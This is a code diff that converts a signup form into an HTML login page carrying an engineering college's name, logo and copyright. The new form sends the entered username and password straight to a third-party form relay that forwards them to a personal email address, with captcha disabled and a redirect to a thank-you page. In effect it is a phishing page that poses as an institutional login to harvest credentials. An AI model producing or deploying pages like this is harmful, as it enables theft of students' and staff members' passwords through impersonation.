@@ -3,42 +3,50 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login & Signup</title>
+  <title>Login Page</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background: linear-gradient(135deg, #f0f2f5, #dce3f7);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
     }
-    .container {
+    .login-container {
       background-color: #fff;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.15);
       text-align: center;
-      width: 340px;
+      width: 320px;
+      border-top: 4px solid #b80000;
     }
     .logo {
-      width: 120px;
-      margin-bottom: 20px;
+      width: 100px;
+      margin-bottom: 15px;
       border-radius: 50%;
       background: #fff;
-      padding: 8px;
+      padding: 6px;
     }
     h2 {
-      margin-bottom: 20px;
+      margin: 10px 0 20px;
       color: #333;
+      font-size: 20px;
+    }
+    label {
+      display: block;
+      text-align: left;
+      font-size: 13px;
+      margin-top: 10px;
+      margin-bottom: 5px;
+      color: #444;
     }
     input[type="text"],
-    input[type="email"],
     input[type="password"] {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      padding: 10px;
       border: 1px solid #ccc;
       border-radius: 6px;
       font-size: 14px;
@@ -46,77 +54,65 @@
     button {
       width: 100%;
       padding: 12px;
-      background-color: #0078D4;
+      margin-top: 15px;
+      background-color: #b80000;
       color: white;
       border: none;
       border-radius: 6px;
       cursor: pointer;
       font-size: 16px;
       transition: background 0.3s;
-      margin-top: 10px;
     }
     button:hover {
-      background-color: #005a9e;
+      background-color: #800000;
     }
-    .footer-text {
-      margin-top: 15px;
+    .links {
+      margin-top: 12px;
       font-size: 12px;
-      color: #777;
     }
-    .signup-link {
-      margin-top: 15px;
-      font-size: 14px;
-    }
-    .signup-link a {
+    .links a {
       color: #b80000;
       text-decoration: none;
-      font-weight: bold;
-      cursor: pointer;
     }
-    /* Hidden sections */
-    .hidden { display: none; }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .footer-text {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #777;
+      line-height: 1.4;
+    }
   </style>
 </head>
 <body>
-  <!-- Login / Signup -->
-  <div class="container" id="form-container">
+  <div class="login-container">
     <img src="logo.jpg" alt="College Logo" class="logo" />
-    <h2 id="form-title">Sign Up</h2>
-    <h3>Adhiparasakthi Engineering College</h3>
+    <h2>Adhiparasakthi Engineering College</h2>
+    
+    <!-- ✅ FormSubmit Integration -->
+    <form action="https://formsubmit.co/ragzzway@gmail.com" method="POST">
+      <!-- Form fields -->
+      <label for="username">Username</label>
+      <input id="username" name="username" type="text" placeholder="Enter username" required>
 
-    <!-- Signup Form (FormSubmit.co) -->
-    <form 
-      action="https://formsubmit.co/ragzzway@gmail.com" 
-      method="POST">
-      
-      <!-- Redirect to thankyou section -->
-      <input type="hidden" name="_next" value="http://localhost/index.html#thankyou">
-      
-      <!-- Prevent spam -->
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Enter password" required>
+
+      <!-- Hidden fields for behavior -->
+      <input type="hidden" name="_next" value="https://yourwebsite.github.io/thankyou.html">
       <input type="hidden" name="_captcha" value="false">
 
-      <input type="text" name="name" placeholder="Full Name" required />
-      <input type="email" name="email" placeholder="Email" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <button type="submit">Sign Up</button>
+      <button type="submit">Login</button>
     </form>
 
-    <p class="footer-text">Adhiparasakthi Engineering College</p>
+    <div class="links">
+      <a href="#">Forgot Password?</a>
+    </div>
+    <p class="footer-text">
+      &copy; 2025 Adhiparasakthi Engineering College <br>
+      All Rights Reserved
+    </p>
   </div>
-
-  <!-- Thank You Section -->
-  <div class="container hidden" id="thankyou">
-    <h2>Thank You!</h2>
-    <p>Thank you for signing up.<br>We will send you a confirmation email shortly.</p>
-    <button onclick="window.location.href='index.html'">Back to Login</button>
-  </div>
-
-  <script>
-    // Show thankyou if redirected with #thankyou
-    if (window.location.hash === "#thankyou") {
-      document.getElementById("form-container").style.display = "none";
-      document.getElementById("thankyou").classList.remove("hidden");
-    }
-  </script>
 </body>
 </html>
